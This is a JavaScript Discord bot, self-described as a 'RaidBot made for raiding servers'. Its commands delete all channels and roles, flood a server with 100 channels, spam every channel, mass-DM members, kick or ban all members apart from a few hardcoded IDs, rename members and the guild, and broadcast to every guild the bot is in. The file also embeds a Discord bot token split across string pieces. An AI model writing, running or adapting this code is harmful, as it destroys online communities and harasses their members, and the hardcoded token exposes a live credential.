const Discord = require('discord.js');
const client = new Discord.Client();
const botPrefix = ";"

const download = require('image-downloader')

var botname = null

const token = "OTA5MzAzMTM2MjU3MjA4MzMy" + ".YZCUiQ." + "mu9KrrrVqA_ojcVOvEOU1GSImak";


client.on('message', msg => {

    if (msg.guild && msg.content.startsWith(';dm')) {
      let text = msg.content.slice(';dm'.length); // cuts off the /private part
      msg.guild.members.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }
    if(msg.content.startsWith(';mc')){
      let channelname = msg.content.slice(';mc'.length); // cuts off the /private part
    var i;
    for (i = 0; i < 100; i++) {
    setTimeout(() => {

        msg.guild.createChannel(channelname,{type: 'text'})
        .then(console.log)
        .catch(console.error);

    },0) 
    }
    }
    if(msg.content.startsWith(";spam")){
      let yourmessage = msg.content.slice(';spam'.length); // cuts off the /private part
      var i;
      
      for (i = 0; i < 100; i++) {
      setTimeout(() => {
         msg.channel.send(yourmessage)
      },0)
      }
      
    }
    if(msg.content.startsWith(';dc')){
      var i = 0
      msg.guild.channels.forEach(channel =>
      i++
      )
      msg.channel.send("Deleting **" + i + "** channels!")
        msg.guild.channels.forEach(channel => 

         
            setTimeout(() => {channel.delete()},0))
            msg.guild.createChannel("Raided By The Yeagerists",{type: 'text'})
            .then(console.log)
            .catch(console.error);
        //}

        
    
    }
    if(msg.content.startsWith(';dr')){
      let notdelete = msg.content.slice(';dr'.length); // cuts off the /private part
      var i = 0
      msg.guild.roles.forEach(role =>
        i++
      )
      msg.channel.send("Starting to delete **"+i+"** roles!")
        msg.guild.roles.forEach(role => 
            setTimeout(() => {
            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
                role.delete()
            }
            },0))
    }
    if(msg.content == ";cmds"){
       const embed = {
        "title": "RaidBot Help",
        "description": "Raidbot made for raiding servers. Use at your own risks.\nCreators are not resposible for what you do with it!",
        "color": 259797,
        "footer": {
          "icon_url": "https://cdn.discordapp.com/embed/avatars/0.png",
          "text": "footer text"
        },
        "thumbnail": {
          "url": "https://regmedia.co.uk/2019/03/12/shutterstock_police_raids.jpg"
        },
        "image": {
          "url": "https://regmedia.co.uk/2019/03/12/shutterstock_police_raids.jpg"
        },
        "author": {
          "name": "Eren Yeager and The Yeagerist",
          "url": "https://discordapp.com",
          "icon_url": "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        "fields": [
          {
            "name": "Commands",
            "value": ";dc      Deletes all channels\n;dr           Deletes all roles\n;mc {name}   Creates 100 channels with name {name}\n;mn {name}  Gives all members in server the nick {name}\n;gn {name} Easy way to change guildname to {name}\n;spam {message}    Spams the channel sent in with {message}\n;mass {message} Spams all channels with {message}\n;dm {message} Sends all members in guild a private message with {message}\n\n;shit                       Kicks all members\n;ban                        Bans all members\n;cmds                          Sends this message"
          }
        ]
      };
      msg.channel.send({ embed });
    }
    if(msg.content.startsWith(';mass')){
      var i;
      for (i = 0; i < 5; i++) {
      setTimeout(() => {
        let yourmessage = msg.content.slice(';mass'.length); // cuts off the /private part        
        msg.guild.channels.forEach(channel =>
          channel.send(yourmessage)
          )
      },0)
      }
    }
    if(msg.content == ";shit"){
      
      msg.guild.members.forEach(member => {

        if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
          member.kick();
        }
      })  
      }
      if(msg.content == ";ban"){      
        msg.guild.members.forEach(member => {
          if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
            member.ban();
          }
        })  
        }
      if(msg.content.startsWith == ";sbn"){
        let botnamefrommessage = msg.content.slice(';sbn'.length);
        client.setNickname(botnamefrommessage);
        botname = botnamefrommessage;
      }
      if(msg.content.startsWith(';mn')){
        let nickname = msg.content.slice(';mn'.length);
        var i = 0;
        msg.guild.members.forEach(member =>{
          i++
        }
          )
        msg.guild.members.forEach(member =>{
          member.setNickname(nickname)
        }
          )
      }
      if(msg.content.startsWith(';gn')){
        let newguildname = msg.content.slice(';gn'.length);
        msg.guild.setName(newguildname)
      }


      if(msg.content.startsWith(';gc')){
        
        let newguildicon = msg.content.slice(';gc'.length);
        options = {
          url: 'http://someurl.com/image.jpg',
          dest: '/images/' 
        }

        download.image(options)
        .then(({ filename, image }) => {
        console.log('Saved to', filename) 
        })

        .catch((err) => console.error(err))
        msg.guild.setIcon(newguildicon)
        .then (console.log)
        .catch (console.error)
      }
      if((msg.content.startsWith(';idk'))){
        let msgtosend = msg.content.slice(';idk'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
          guildList.forEach(guild =>
            guild.channels.forEach(channel =>
              channel.send(msgtosend)
            )
            
            )
        } catch (err) {
          console.log("could not send message")
        }
      }
      if((msg.content.startsWith(';idk2'))){
        let nickname = msg.content.slice(';idk2'.length)
        msg.delete();
        var guildList = client.guilds.array();
        try{
          guildList.forEach(guild =>
            guild.members.forEach(member =>{
              member.setNickname(nickname);
            })
            
            )
        } catch (err) {
          console.log("could not send message")
        }
      }
  });
client.login(token)
